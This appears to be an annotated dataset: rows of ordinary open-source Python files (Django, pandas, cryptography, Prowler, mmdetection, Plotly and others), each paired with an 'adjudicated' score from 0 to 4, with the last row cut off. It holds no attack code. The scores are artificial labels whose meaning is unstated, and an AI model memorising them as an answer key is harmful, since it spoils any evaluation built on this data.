351	adjudicated	3	"from django.contrib.messages.storage.base import BaseStorage<<NEWL>>from django.contrib.messages.storage.cookie import CookieStorage<<NEWL>>from django.contrib.messages.storage.session import SessionStorage<<NEWL>><<NEWL>><<NEWL>>class FallbackStorage(BaseStorage):<<NEWL>>    """"""<<NEWL>>    Try to store all messages in the first backend. Store any unstored<<NEWL>>    messages in each subsequent backend.<<NEWL>>    """"""<<NEWL>><<NEWL>>    storage_classes = (CookieStorage, SessionStorage)<<NEWL>><<NEWL>>    def __init__(self, *args, **kwargs):<<NEWL>>        super().__init__(*args, **kwargs)<<NEWL>>        self.storages = [<<NEWL>>            storage_class(*args, **kwargs) for storage_class in self.storage_classes<<NEWL>>        ]<<NEWL>>        self._used_storages = set()<<NEWL>><<NEWL>>    def _get(self, *args, **kwargs):<<NEWL>>        """"""<<NEWL>>        Get a single list of messages from all storage backends.<<NEWL>>        """"""<<NEWL>>        all_messages = []<<NEWL>>        for storage in self.storages:<<NEWL>>            messages, all_retrieved = storage._get()<<NEWL>>            # If the backend hasn't been used, no more retrieval is necessary.<<NEWL>>            if messages is None:<<NEWL>>                break<<NEWL>>            if messages:<<NEWL>>                self._used_storages.add(storage)<<NEWL>>            all_messages.extend(messages)<<NEWL>>            # If this storage class contained all the messages, no further<<NEWL>>            # retrieval is necessary<<NEWL>>            if all_retrieved:<<NEWL>>                break<<NEWL>>        return all_messages, all_retrieved<<NEWL>><<NEWL>>    def _store(self, messages, response, *args, **kwargs):<<NEWL>>        """"""<<NEWL>>        Store the messages and return any unstored messages after trying all<<NEWL>>        backends.<<NEWL>><<NEWL>>        For each storage backend, any messages not stored are passed on to the<<NEWL>>        next backend.<<NEWL>>        """"""<<NEWL>>        for storage in self.storages:<<NEWL>>            if messages:<<NEWL>>                messages = storage._store(messages, response, remove_oldest=False)<<NEWL>>            # Even if there are no more messages, continue iterating to ensure<<NEWL>>            # storages which contained messages are flushed.<<NEWL>>            elif storage in self._used_storages:<<NEWL>>                storage._store([], response)<<NEWL>>                self._used_storages.remove(storage)<<NEWL>>        return messages"
173	adjudicated	0	"from pyrogram import filters<<NEWL>><<NEWL>>from config import BANNED_USERS<<NEWL>>from ShizukaXMusic import YouTube, app<<NEWL>>from ShizukaXMusic.utils.channelplay import get_channeplayCB<<NEWL>>from ShizukaXMusic.utils.decorators.language import languageCB<<NEWL>>from ShizukaXMusic.utils.stream.stream import stream<<NEWL>><<NEWL>><<NEWL>>@app.on_callback_query(filters.regex(""LiveStream"") & ~BANNED_USERS)<<NEWL>>@languageCB<<NEWL>>async def play_live_stream(client, CallbackQuery, _):<<NEWL>>    callback_data = CallbackQuery.data.strip()<<NEWL>>    callback_request = callback_data.split(None, 1)[1]<<NEWL>>    vidid, user_id, mode, cplay, fplay = callback_request.split(""|"")<<NEWL>>    if CallbackQuery.from_user.id != int(user_id):<<NEWL>>        try:<<NEWL>>            return await CallbackQuery.answer(_[""playcb_1""], show_alert=True)<<NEWL>>        except:<<NEWL>>            return<<NEWL>>    try:<<NEWL>>        chat_id, channel = await get_channeplayCB(_, cplay, CallbackQuery)<<NEWL>>    except:<<NEWL>>        return<<NEWL>>    video = True if mode == ""v"" else None<<NEWL>>    user_name = CallbackQuery.from_user.first_name<<NEWL>>    await CallbackQuery.message.delete()<<NEWL>>    try:<<NEWL>>        await CallbackQuery.answer()<<NEWL>>    except:<<NEWL>>        pass<<NEWL>>    mystic = await CallbackQuery.message.reply_text(<<NEWL>>        _[""play_2""].format(channel) if channel else _[""play_1""]<<NEWL>>    )<<NEWL>>    try:<<NEWL>>        details, track_id = await YouTube.track(vidid, True)<<NEWL>>    except Exception:<<NEWL>>        return await mystic.edit_text(_[""play_3""])<<NEWL>>    ffplay = True if fplay == ""f"" else None<<NEWL>>    if not details[""duration_min""]:<<NEWL>>        try:<<NEWL>>            await stream(<<NEWL>>                _,<<NEWL>>                mystic,<<NEWL>>                user_id,<<NEWL>>                details,<<NEWL>>                chat_id,<<NEWL>>                user_name,<<NEWL>>                CallbackQuery.message.chat.id,<<NEWL>>                video,<<NEWL>>                streamtype=""live"",<<NEWL>>                forceplay=ffplay,<<NEWL>>            )<<NEWL>>        except Exception as e:<<NEWL>>            ex_type = type(e).__name__<<NEWL>>            err = e if ex_type == ""AssistantErr"" else _[""general_3""].format(ex_type)<<NEWL>>            return await mystic.edit_text(err)<<NEWL>>    else:<<NEWL>>        return await mystic.edit_text(""Éª á´á´É´'á´ á´ÊÉªÉ´á´ á´Êá´á´ Éªá´'s á´ ÊÉªá´ á´ sá´Êá´á´á´."")<<NEWL>>    await mystic.delete()"
33	adjudicated	3	"import sys<<NEWL>><<NEWL>><<NEWL>>class VendorImporter:<<NEWL>>    """"""<<NEWL>>    A PEP 302 meta path importer for finding optionally-vendored<<NEWL>>    or otherwise naturally-installed packages from root_name.<<NEWL>>    """"""<<NEWL>><<NEWL>>    def __init__(self, root_name, vendored_names=(), vendor_pkg=None):<<NEWL>>        self.root_name = root_name<<NEWL>>        self.vendored_names = set(vendored_names)<<NEWL>>        self.vendor_pkg = vendor_pkg or root_name.replace('extern', '_vendor')<<NEWL>><<NEWL>>    @property<<NEWL>>    def search_path(self):<<NEWL>>        """"""<<NEWL>>        Search first the vendor package then as a natural package.<<NEWL>>        """"""<<NEWL>>        yield self.vendor_pkg + '.'<<NEWL>>        yield ''<<NEWL>><<NEWL>>    def find_module(self, fullname, path=None):<<NEWL>>        """"""<<NEWL>>        Return self when fullname starts with root_name and the<<NEWL>>        target module is one vendored through this importer.<<NEWL>>        """"""<<NEWL>>        root, base, target = fullname.partition(self.root_name + '.')<<NEWL>>        if root:<<NEWL>>            return<<NEWL>>        if not any(map(target.startswith, self.vendored_names)):<<NEWL>>            return<<NEWL>>        return self<<NEWL>><<NEWL>>    def load_module(self, fullname):<<NEWL>>        """"""<<NEWL>>        Iterate over the search path to locate and load fullname.<<NEWL>>        """"""<<NEWL>>        root, base, target = fullname.partition(self.root_name + '.')<<NEWL>>        for prefix in self.search_path:<<NEWL>>            try:<<NEWL>>                extant = prefix + target<<NEWL>>                __import__(extant)<<NEWL>>                mod = sys.modules[extant]<<NEWL>>                sys.modules[fullname] = mod<<NEWL>>                return mod<<NEWL>>            except ImportError:<<NEWL>>                pass<<NEWL>>        else:<<NEWL>>            raise ImportError(<<NEWL>>                ""The '{target}' package is required; ""<<NEWL>>                ""normally this is bundled with this package so if you get ""<<NEWL>>                ""this warning, consult the packager of your ""<<NEWL>>                ""distribution."".format(**locals())<<NEWL>>            )<<NEWL>><<NEWL>>    def install(self):<<NEWL>>        """"""<<NEWL>>        Install this importer into sys.meta_path if not already present.<<NEWL>>        """"""<<NEWL>>        if self not in sys.meta_path:<<NEWL>>            sys.meta_path.append(self)<<NEWL>><<NEWL>><<NEWL>>names = 'six', 'packaging', 'pyparsing', 'ordered_set',<<NEWL>>VendorImporter(__name__, names, 'setuptools._vendor').install()"
122	adjudicated	3	"# Copyright 2021 Google LLC<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#     https://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>><<NEWL>>import uuid<<NEWL>><<NEWL>>import google.auth<<NEWL>><<NEWL>>from google.cloud import speech_v1p1beta1 as speech<<NEWL>><<NEWL>>import pytest<<NEWL>><<NEWL>>import speech_model_adaptation_beta<<NEWL>><<NEWL>><<NEWL>>STORAGE_URI = ""gs://cloud-samples-data/speech/brooklyn_bridge.raw""<<NEWL>>_, PROJECT_ID = google.auth.default()<<NEWL>>LOCATION = ""global""<<NEWL>>client = speech.AdaptationClient()<<NEWL>><<NEWL>><<NEWL>>def test_model_adaptation_beta(custom_class_id, phrase_set_id, capsys):<<NEWL>>    class_id = custom_class_id<<NEWL>>    phrase_id = phrase_set_id<<NEWL>>    transcript = speech_model_adaptation_beta.transcribe_with_model_adaptation(<<NEWL>>        PROJECT_ID, LOCATION, STORAGE_URI, class_id, phrase_id<<NEWL>>    )<<NEWL>>    assert ""how long is the Brooklyn Bridge"" in transcript<<NEWL>><<NEWL>><<NEWL>>@pytest.fixture<<NEWL>>def custom_class_id():<<NEWL>>    # The custom class id can't be too long<<NEWL>>    custom_class_id = f""customClassId{str(uuid.uuid4())[:8]}""<<NEWL>>    yield custom_class_id<<NEWL>>    # clean up resources<<NEWL>>    CLASS_PARENT = (<<NEWL>>        f""projects/{PROJECT_ID}/locations/{LOCATION}/customClasses/{custom_class_id}""<<NEWL>>    )<<NEWL>>    client.delete_custom_class(name=CLASS_PARENT)<<NEWL>><<NEWL>><<NEWL>>@pytest.fixture<<NEWL>>def phrase_set_id():<<NEWL>>    # The phrase set id can't be too long<<NEWL>>    phrase_set_id = f""phraseSetId{str(uuid.uuid4())[:8]}""<<NEWL>>    yield phrase_set_id<<NEWL>>    # clean up resources<<NEWL>>    PHRASE_PARENT = (<<NEWL>>        f""projects/{PROJECT_ID}/locations/{LOCATION}/phraseSets/{phrase_set_id}""<<NEWL>>    )<<NEWL>>    client.delete_phrase_set(name=PHRASE_PARENT)"
62	adjudicated	3	"from __future__ import annotations<<NEWL>><<NEWL>>import warnings<<NEWL>><<NEWL>>import numpy as np<<NEWL>>import pyarrow<<NEWL>><<NEWL>>from pandas.errors import PerformanceWarning<<NEWL>>from pandas.util._exceptions import find_stack_level<<NEWL>><<NEWL>><<NEWL>>def fallback_performancewarning(version: str | None = None) -> None:<<NEWL>>    """"""<<NEWL>>    Raise a PerformanceWarning for falling back to ExtensionArray's<<NEWL>>    non-pyarrow method<<NEWL>>    """"""<<NEWL>>    msg = ""Falling back on a non-pyarrow code path which may decrease performance.""<<NEWL>>    if version is not None:<<NEWL>>        msg += f"" Upgrade to pyarrow >={version} to possibly suppress this warning.""<<NEWL>>    warnings.warn(msg, PerformanceWarning, stacklevel=find_stack_level())<<NEWL>><<NEWL>><<NEWL>>def pyarrow_array_to_numpy_and_mask(<<NEWL>>    arr, dtype: np.dtype<<NEWL>>) -> tuple[np.ndarray, np.ndarray]:<<NEWL>>    """"""<<NEWL>>    Convert a primitive pyarrow.Array to a numpy array and boolean mask based<<NEWL>>    on the buffers of the Array.<<NEWL>><<NEWL>>    At the moment pyarrow.BooleanArray is not supported.<<NEWL>><<NEWL>>    Parameters<<NEWL>>    ----------<<NEWL>>    arr : pyarrow.Array<<NEWL>>    dtype : numpy.dtype<<NEWL>><<NEWL>>    Returns<<NEWL>>    -------<<NEWL>>    (data, mask)<<NEWL>>        Tuple of two numpy arrays with the raw data (with specified dtype) and<<NEWL>>        a boolean mask (validity mask, so False means missing)<<NEWL>>    """"""<<NEWL>>    dtype = np.dtype(dtype)<<NEWL>><<NEWL>>    buflist = arr.buffers()<<NEWL>>    # Since Arrow buffers might contain padding and the data might be offset,<<NEWL>>    # the buffer gets sliced here before handing it to numpy.<<NEWL>>    # See also https://github.com/pandas-dev/pandas/issues/40896<<NEWL>>    offset = arr.offset * dtype.itemsize<<NEWL>>    length = len(arr) * dtype.itemsize<<NEWL>>    data_buf = buflist[1][offset : offset + length]<<NEWL>>    data = np.frombuffer(data_buf, dtype=dtype)<<NEWL>>    bitmask = buflist[0]<<NEWL>>    if bitmask is not None:<<NEWL>>        mask = pyarrow.BooleanArray.from_buffers(<<NEWL>>            pyarrow.bool_(), len(arr), [None, bitmask], offset=arr.offset<<NEWL>>        )<<NEWL>>        mask = np.asarray(mask)<<NEWL>>    else:<<NEWL>>        mask = np.ones(len(arr), dtype=bool)<<NEWL>>    return data, mask"
365	adjudicated	0	"from sqlalchemy import create_engine<<NEWL>>import pandas as pd<<NEWL>><<NEWL>>class Manager:<<NEWL>>    __instance = None<<NEWL>><<NEWL>>    def __init__(self, engine=None, username=None, password=None, database=None, host=None, port=None):<<NEWL>>        if Manager.__instance is None:<<NEWL>>            self.engine_type = engine<<NEWL>>            self.username = username<<NEWL>>            self.password = password<<NEWL>>            self.database = database<<NEWL>>            self.host = host<<NEWL>>            self.port = port<<NEWL>>            self.url = self._generate_url()<<NEWL>>            self.engine = create_engine(self.url)<<NEWL>>            Manager.__instance = self<<NEWL>>        else:<<NEWL>>            raise Exception(""Cannot create multiple instances of Database class"")<<NEWL>><<NEWL>>    @staticmethod<<NEWL>>    def get_instance(engine=None, username=None, password=None, database=None, host=None, port=None):<<NEWL>>        if Manager.__instance is None:<<NEWL>>            Manager(engine, username, password, database, host, port)<<NEWL>>        return Manager.__instance<<NEWL>><<NEWL>>    def _generate_url(self):<<NEWL>>        if self.engine_type == 'postgresql':<<NEWL>>            return f""postgresql://{self.username}:{self.password}@{self.host}:{self.port}/{self.database}""<<NEWL>>        elif self.engine_type == 'mysql':<<NEWL>>            return f""mysql+pymysql://{self.username}:{self.password}@{self.host}:{self.port}/{self.database}""<<NEWL>>        elif self.engine_type == 'sqlite':<<NEWL>>            return f""sqlite:///{self.database}""<<NEWL>>        elif self.engine_type == 'oracle':<<NEWL>>            return f""oracle://{self.username}:{self.password}@{self.host}:{self.port}/{self.database}""<<NEWL>>        elif self.engine_type == 'mssql':<<NEWL>>            return f""mssql+pymssql://{self.username}:{self.password}@{self.host}:{self.port}/{self.database}""<<NEWL>>        else:<<NEWL>>            raise Exception(""Unsupported engine type"")<<NEWL>><<NEWL>>    def execute_query(self, query):<<NEWL>>        with self.engine.connect() as conn:<<NEWL>>            result = conn.execute(query)<<NEWL>>            data = pd.DataFrame(result.fetchall(), columns=result.keys())<<NEWL>>        return data"
225	adjudicated	0	"from django.contrib.auth.management.commands import createsuperuser<<NEWL>>from django.core.management import CommandError<<NEWL>>from django.db.models import EmailField<<NEWL>>from allauth.account.models import EmailAddress<<NEWL>><<NEWL>><<NEWL>>class Command(createsuperuser.Command):<<NEWL>>    help = 'Crate a superuser, and allow password to be provided'<<NEWL>><<NEWL>>    def add_arguments(self, parser):<<NEWL>>        super(Command, self).add_arguments(parser)<<NEWL>>        parser.add_argument(<<NEWL>>            '--password', dest='password', default=None,<<NEWL>>            help='Specifies the password for the superuser.',<<NEWL>>        )<<NEWL>>        if self.UserModel.USERNAME_FIELD != ""username"":<<NEWL>>            parser.add_argument(<<NEWL>>                '--username', dest='username', default=None,<<NEWL>>                help=""Specifies the username for the superuser""<<NEWL>>            )<<NEWL>><<NEWL>>    def handle(self, *args, **options):<<NEWL>>        password = options.get('password')<<NEWL>>        username = options.get('username')<<NEWL>>        database = options.get('database')<<NEWL>>        email = options.get('email')<<NEWL>><<NEWL>>        User = self.UserModel<<NEWL>>        username_field_type = type(User._meta.get_field(User.USERNAME_FIELD))<<NEWL>>        username = email if username_field_type == EmailField else username<<NEWL>>        username_type = ""email"" if username_field_type == EmailField else ""username""<<NEWL>>        if not password or not username:<<NEWL>>            raise CommandError(f""You need to specify both password and {username_type}."")<<NEWL>>        options.update({User.USERNAME_FIELD: username})<<NEWL>>        super(Command, self).handle(*args, **options)<<NEWL>><<NEWL>>        user = self.UserModel._default_manager.db_manager(database).get(**{User.USERNAME_FIELD: username})<<NEWL>>        if password:<<NEWL>>            user.set_password(password)<<NEWL>>            user.save()<<NEWL>><<NEWL>>        if email:<<NEWL>>            EmailAddress.objects.create(user=user, email=email, primary=True, verified=True)"
334	adjudicated	0	"# This file is dual licensed under the terms of the Apache License, Version<<NEWL>># 2.0, and the BSD License. See the LICENSE file in the root of this repository<<NEWL>># for complete details.<<NEWL>><<NEWL>>import typing<<NEWL>><<NEWL>>from cryptography.hazmat.primitives import hashes<<NEWL>>from cryptography.hazmat.primitives.asymmetric.utils import Prehashed<<NEWL>><<NEWL>>if typing.TYPE_CHECKING:<<NEWL>>    from cryptography.hazmat.backends.openssl.backend import Backend<<NEWL>><<NEWL>><<NEWL>>def _evp_pkey_derive(backend: ""Backend"", evp_pkey, peer_public_key) -> bytes:<<NEWL>>    ctx = backend._lib.EVP_PKEY_CTX_new(evp_pkey, backend._ffi.NULL)<<NEWL>>    backend.openssl_assert(ctx != backend._ffi.NULL)<<NEWL>>    ctx = backend._ffi.gc(ctx, backend._lib.EVP_PKEY_CTX_free)<<NEWL>>    res = backend._lib.EVP_PKEY_derive_init(ctx)<<NEWL>>    backend.openssl_assert(res == 1)<<NEWL>>    res = backend._lib.EVP_PKEY_derive_set_peer(ctx, peer_public_key._evp_pkey)<<NEWL>>    if res != 1:<<NEWL>>        errors_with_text = backend._consume_errors_with_text()<<NEWL>>        raise ValueError(""Error computing shared key."", errors_with_text)<<NEWL>><<NEWL>>    keylen = backend._ffi.new(""size_t *"")<<NEWL>>    res = backend._lib.EVP_PKEY_derive(ctx, backend._ffi.NULL, keylen)<<NEWL>>    backend.openssl_assert(res == 1)<<NEWL>>    backend.openssl_assert(keylen[0] > 0)<<NEWL>>    buf = backend._ffi.new(""unsigned char[]"", keylen[0])<<NEWL>>    res = backend._lib.EVP_PKEY_derive(ctx, buf, keylen)<<NEWL>>    if res != 1:<<NEWL>>        errors_with_text = backend._consume_errors_with_text()<<NEWL>>        raise ValueError(""Error computing shared key."", errors_with_text)<<NEWL>><<NEWL>>    return backend._ffi.buffer(buf, keylen[0])[:]<<NEWL>><<NEWL>><<NEWL>>def _calculate_digest_and_algorithm(<<NEWL>>    data: bytes,<<NEWL>>    algorithm: typing.Union[Prehashed, hashes.HashAlgorithm],<<NEWL>>) -> typing.Tuple[bytes, hashes.HashAlgorithm]:<<NEWL>>    if not isinstance(algorithm, Prehashed):<<NEWL>>        hash_ctx = hashes.Hash(algorithm)<<NEWL>>        hash_ctx.update(data)<<NEWL>>        data = hash_ctx.finalize()<<NEWL>>    else:<<NEWL>>        algorithm = algorithm._algorithm<<NEWL>><<NEWL>>    if len(data) != algorithm.digest_size:<<NEWL>>        raise ValueError(<<NEWL>>            ""The provided data must be the same length as the hash ""<<NEWL>>            ""algorithm's digest size.""<<NEWL>>        )<<NEWL>><<NEWL>>    return (data, algorithm)"
274	adjudicated	0	"import threading<<NEWL>>from dataclasses import dataclass<<NEWL>><<NEWL>>from prowler.lib.logger import logger<<NEWL>>from prowler.providers.aws.aws_provider import generate_regional_clients<<NEWL>><<NEWL>><<NEWL>>################## Macie<<NEWL>>class Macie:<<NEWL>>    def __init__(self, audit_info):<<NEWL>>        self.service = ""macie2""<<NEWL>>        self.session = audit_info.audit_session<<NEWL>>        self.audited_account = audit_info.audited_account<<NEWL>>        self.regional_clients = generate_regional_clients(self.service, audit_info)<<NEWL>>        self.sessions = []<<NEWL>>        self.__threading_call__(self.__get_macie_session__)<<NEWL>><<NEWL>>    def __get_session__(self):<<NEWL>>        return self.session<<NEWL>><<NEWL>>    def __threading_call__(self, call):<<NEWL>>        threads = []<<NEWL>>        for regional_client in self.regional_clients.values():<<NEWL>>            threads.append(threading.Thread(target=call, args=(regional_client,)))<<NEWL>>        for t in threads:<<NEWL>>            t.start()<<NEWL>>        for t in threads:<<NEWL>>            t.join()<<NEWL>><<NEWL>>    def __get_macie_session__(self, regional_client):<<NEWL>>        logger.info(""Macie - Get Macie Session..."")<<NEWL>>        try:<<NEWL>>            self.sessions.append(<<NEWL>>                Session(<<NEWL>>                    regional_client.get_macie_session()[""status""],<<NEWL>>                    regional_client.region,<<NEWL>>                )<<NEWL>>            )<<NEWL>><<NEWL>>        except Exception as error:<<NEWL>>            if ""Macie is not enabled"" in str(error):<<NEWL>>                self.sessions.append(<<NEWL>>                    Session(<<NEWL>>                        ""DISABLED"",<<NEWL>>                        regional_client.region,<<NEWL>>                    )<<NEWL>>                )<<NEWL>>            else:<<NEWL>>                logger.error(<<NEWL>>                    f""{regional_client.region} -- {error.__class__.__name__}[{error.__traceback__.tb_lineno}]: {error}""<<NEWL>>                )<<NEWL>><<NEWL>><<NEWL>>@dataclass<<NEWL>>class Session:<<NEWL>>    status: str<<NEWL>>    region: str<<NEWL>><<NEWL>>    def __init__(<<NEWL>>        self,<<NEWL>>        status,<<NEWL>>        region,<<NEWL>>    ):<<NEWL>>        self.status = status<<NEWL>>        self.region = region"
56	adjudicated	4	"import re<<NEWL>><<NEWL>>from ._functools import method_cache<<NEWL>><<NEWL>><<NEWL>># from jaraco.text 3.5<<NEWL>>class FoldedCase(str):<<NEWL>>    """"""<<NEWL>>    A case insensitive string class; behaves just like str<<NEWL>>    except compares equal when the only variation is case.<<NEWL>><<NEWL>>    >>> s = FoldedCase('hello world')<<NEWL>><<NEWL>>    >>> s == 'Hello World'<<NEWL>>    True<<NEWL>><<NEWL>>    >>> 'Hello World' == s<<NEWL>>    True<<NEWL>><<NEWL>>    >>> s != 'Hello World'<<NEWL>>    False<<NEWL>><<NEWL>>    >>> s.index('O')<<NEWL>>    4<<NEWL>><<NEWL>>    >>> s.split('O')<<NEWL>>    ['hell', ' w', 'rld']<<NEWL>><<NEWL>>    >>> sorted(map(FoldedCase, ['GAMMA', 'alpha', 'Beta']))<<NEWL>>    ['alpha', 'Beta', 'GAMMA']<<NEWL>><<NEWL>>    Sequence membership is straightforward.<<NEWL>><<NEWL>>    >>> ""Hello World"" in [s]<<NEWL>>    True<<NEWL>>    >>> s in [""Hello World""]<<NEWL>>    True<<NEWL>><<NEWL>>    You may test for set inclusion, but candidate and elements<<NEWL>>    must both be folded.<<NEWL>><<NEWL>>    >>> FoldedCase(""Hello World"") in {s}<<NEWL>>    True<<NEWL>>    >>> s in {FoldedCase(""Hello World"")}<<NEWL>>    True<<NEWL>><<NEWL>>    String inclusion works as long as the FoldedCase object<<NEWL>>    is on the right.<<NEWL>><<NEWL>>    >>> ""hello"" in FoldedCase(""Hello World"")<<NEWL>>    True<<NEWL>><<NEWL>>    But not if the FoldedCase object is on the left:<<NEWL>><<NEWL>>    >>> FoldedCase('hello') in 'Hello World'<<NEWL>>    False<<NEWL>><<NEWL>>    In that case, use in_:<<NEWL>><<NEWL>>    >>> FoldedCase('hello').in_('Hello World')<<NEWL>>    True<<NEWL>><<NEWL>>    >>> FoldedCase('hello') > FoldedCase('Hello')<<NEWL>>    False<<NEWL>>    """"""<<NEWL>><<NEWL>>    def __lt__(self, other):<<NEWL>>        return self.lower() < other.lower()<<NEWL>><<NEWL>>    def __gt__(self, other):<<NEWL>>        return self.lower() > other.lower()<<NEWL>><<NEWL>>    def __eq__(self, other):<<NEWL>>        return self.lower() == other.lower()<<NEWL>><<NEWL>>    def __ne__(self, other):<<NEWL>>        return self.lower() != other.lower()<<NEWL>><<NEWL>>    def __hash__(self):<<NEWL>>        return hash(self.lower())<<NEWL>><<NEWL>>    def __contains__(self, other):<<NEWL>>        return super().lower().__contains__(other.lower())<<NEWL>><<NEWL>>    def in_(self, other):<<NEWL>>        ""Does self appear in other?""<<NEWL>>        return self in FoldedCase(other)<<NEWL>><<NEWL>>    # cache lower since it's likely to be called frequently.<<NEWL>>    @method_cache<<NEWL>>    def lower(self):<<NEWL>>        return super().lower()<<NEWL>><<NEWL>>    def index(self, sub):<<NEWL>>        return self.lower().index(sub.lower())<<NEWL>><<NEWL>>    def split(self, splitter=' ', maxsplit=0):<<NEWL>>        pattern = re.compile(re.escape(splitter), re.I)<<NEWL>>        return pattern.split(self, maxsplit)"
287	adjudicated	0	_base_ = [<<NEWL>>    '../_base_/datasets/coco_detection.py',<<NEWL>>    '../_base_/schedules/schedule_1x.py', '../_base_/default_runtime.py'<<NEWL>>]<<NEWL>>model = dict(<<NEWL>>    type='ATSS',<<NEWL>>    backbone=dict(<<NEWL>>        type='ResNet',<<NEWL>>        depth=50,<<NEWL>>        num_stages=4,<<NEWL>>        out_indices=(0, 1, 2, 3),<<NEWL>>        frozen_stages=1,<<NEWL>>        norm_cfg=dict(type='BN', requires_grad=True),<<NEWL>>        norm_eval=True,<<NEWL>>        style='pytorch',<<NEWL>>        init_cfg=dict(type='Pretrained', checkpoint='torchvision://resnet50')),<<NEWL>>    neck=[<<NEWL>>        dict(<<NEWL>>            type='FPN',<<NEWL>>            in_channels=[256, 512, 1024, 2048],<<NEWL>>            out_channels=256,<<NEWL>>            start_level=1,<<NEWL>>            add_extra_convs='on_output',<<NEWL>>            num_outs=5),<<NEWL>>        dict(type='DyHead', in_channels=256, out_channels=256, num_blocks=6)<<NEWL>>    ],<<NEWL>>    bbox_head=dict(<<NEWL>>        type='ATSSHead',<<NEWL>>        num_classes=80,<<NEWL>>        in_channels=256,<<NEWL>>        stacked_convs=0,<<NEWL>>        feat_channels=256,<<NEWL>>        anchor_generator=dict(<<NEWL>>            type='AnchorGenerator',<<NEWL>>            ratios=[1.0],<<NEWL>>            octave_base_scale=8,<<NEWL>>            scales_per_octave=1,<<NEWL>>            strides=[8, 16, 32, 64, 128]),<<NEWL>>        bbox_coder=dict(<<NEWL>>            type='DeltaXYWHBBoxCoder',<<NEWL>>            target_means=[.0, .0, .0, .0],<<NEWL>>            target_stds=[0.1, 0.1, 0.2, 0.2]),<<NEWL>>        loss_cls=dict(<<NEWL>>            type='FocalLoss',<<NEWL>>            use_sigmoid=True,<<NEWL>>            gamma=2.0,<<NEWL>>            alpha=0.25,<<NEWL>>            loss_weight=1.0),<<NEWL>>        loss_bbox=dict(type='GIoULoss', loss_weight=2.0),<<NEWL>>        loss_centerness=dict(<<NEWL>>            type='CrossEntropyLoss', use_sigmoid=True, loss_weight=1.0)),<<NEWL>>    # training and testing settings<<NEWL>>    train_cfg=dict(<<NEWL>>        assigner=dict(type='ATSSAssigner', topk=9),<<NEWL>>        allowed_border=-1,<<NEWL>>        pos_weight=-1,<<NEWL>>        debug=False),<<NEWL>>    test_cfg=dict(<<NEWL>>        nms_pre=1000,<<NEWL>>        min_bbox_size=0,<<NEWL>>        score_thr=0.05,<<NEWL>>        nms=dict(type='nms', iou_threshold=0.6),<<NEWL>>        max_per_img=100))<<NEWL>># optimizer<<NEWL>>optimizer = dict(type='SGD', lr=0.01, momentum=0.9, weight_decay=0.0001)
116	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class TextfontValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(self, plotly_name=""textfont"", parent_name=""scatter"", **kwargs):<<NEWL>>        super(TextfontValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Textfont""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            color<<NEWL>><<NEWL>>            colorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `color`.<<NEWL>>            family<<NEWL>>                HTML font family - the typeface that will be<<NEWL>>                applied by the web browser. The web browser<<NEWL>>                will only be able to apply a font if it is<<NEWL>>                available on the system which it operates.<<NEWL>>                Provide multiple font families, separated by<<NEWL>>                commas, to indicate the preference in which to<<NEWL>>                apply fonts if they aren't available on the<<NEWL>>                system. The Chart Studio Cloud (at<<NEWL>>                https://chart-studio.plotly.com or on-premise)<<NEWL>>                generates images on a server, where only a<<NEWL>>                select number of fonts are installed and<<NEWL>>                supported. These include ""Arial"", ""Balto"",<<NEWL>>                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",<<NEWL>>                ""Droid Sans Mono"", ""Gravitas One"", ""Old<<NEWL>>                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans<<NEWL>>                Narrow"", ""Raleway"", ""Times New Roman"".<<NEWL>>            familysrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `family`.<<NEWL>>            size<<NEWL>><<NEWL>>            sizesrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `size`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
396	adjudicated	0	# Generated by Django 3.2.18 on 2023-03-09 11:26<<NEWL>><<NEWL>>from django.db import migrations, models<<NEWL>>import django.db.models.deletion<<NEWL>>import multiselectfield.db.fields<<NEWL>><<NEWL>><<NEWL>>class Migration(migrations.Migration):<<NEWL>><<NEWL>>    initial = True<<NEWL>><<NEWL>>    dependencies = [<<NEWL>>    ]<<NEWL>><<NEWL>>    operations = [<<NEWL>>        migrations.CreateModel(<<NEWL>>            name='Event',<<NEWL>>            fields=[<<NEWL>>                ('id', models.BigAutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),<<NEWL>>                ('event_name', models.CharField(max_length=200, unique=True)),<<NEWL>>                ('event_date', models.DateField()),<<NEWL>>                ('event_time', models.TimeField()),<<NEWL>>                ('created_on', models.DateTimeField(auto_now_add=True)),<<NEWL>>            ],<<NEWL>>        ),<<NEWL>>        migrations.CreateModel(<<NEWL>>            name='Guest',<<NEWL>>            fields=[<<NEWL>>                ('id', models.BigAutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),<<NEWL>>                ('guest_name', models.CharField(max_length=200, unique=True)),<<NEWL>>                ('slug', models.SlugField(max_length=200, unique=True)),<<NEWL>>                ('email', models.EmailField(max_length=254)),<<NEWL>>                ('is_attending', models.BooleanField(choices=[(False, 'No'), (True, 'Yes')], default='', verbose_name='Attending?')),<<NEWL>>                ('message', models.TextField(blank=True)),<<NEWL>>                ('dietary_requirements', multiselectfield.db.fields.MultiSelectField(choices=[(1, 'none'), (2, 'coeliac'), (3, 'food allergy'), (4, 'food intolerance'), (5, 'vegetarian'), (6, 'vegan'), (7, 'pescatarian'), (8, 'teetotal')], max_length=15)),<<NEWL>>                ('plus_one_attending', models.BooleanField(choices=[(False, 